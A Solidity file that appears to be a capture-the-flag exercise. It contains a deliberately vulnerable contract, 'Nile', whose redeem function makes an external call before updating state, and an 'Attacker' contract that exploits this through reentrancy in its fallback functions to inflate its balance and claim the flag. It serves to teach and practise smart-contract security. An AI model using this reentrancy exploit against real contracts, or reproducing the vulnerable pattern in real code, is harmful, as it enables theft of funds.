pragma solidity ^0.7.6;

contract Nile {
    mapping(address => uint256) balance;
    mapping(address => uint256) redeemable;
    mapping(address => bool) accounts;

    event GetFlag(bytes32);
    event Redeem(address, uint256);
    event Created(address, uint256);
    event Balance(uint256);

    function redeem(uint256 amount) public {
        require(accounts[msg.sender]);
        require(redeemable[msg.sender] > amount);

        (bool status, ) = msg.sender.call("");

        if (!status) {
            revert();
        }

        redeemable[msg.sender] -= amount;

        balance[msg.sender] += amount;

        emit Redeem(msg.sender, amount);
    }

    function createAccount() public {
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 100;
        accounts[msg.sender] = true;

        emit Created(msg.sender, 100);
    }

    function createEmptyAccount() public {
        // empty account starts with 0 balance
        balance[msg.sender] = 0;
        accounts[msg.sender] = true;
    }

    function deleteAccount() public {
        require(accounts[msg.sender]);
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 0;
        accounts[msg.sender] = false;
    }

    // added
    function getBalance() public view returns (uint256) {
        return balance[msg.sender];
    }

    function emitBalance() public {
        emit Balance(balance[msg.sender]);
    }

    function getFlag(bytes32 token) public {
        require(accounts[msg.sender]);
        require(balance[msg.sender] > 1000);

        emit GetFlag(token);
    }
}

contract Attacker {
    Nile addr;
    mapping(address => uint256) attempts;

    constructor(address _addr) {
        addr = Nile(_addr);
        addr.createAccount();
    }

    function attack(bytes32 token) public {
        addr.redeem(90);
        addr.getFlag(token);
    }

    fallback() external payable {
        attempts[msg.sender] += 1;
        if (attempts[msg.sender] < 15) {
            addr.redeem(90);
        }
    }

    receive() external payable {
        attempts[msg.sender] += 1;
        if (attempts[msg.sender] < 15) {
            addr.redeem(90);
        }
    }
}
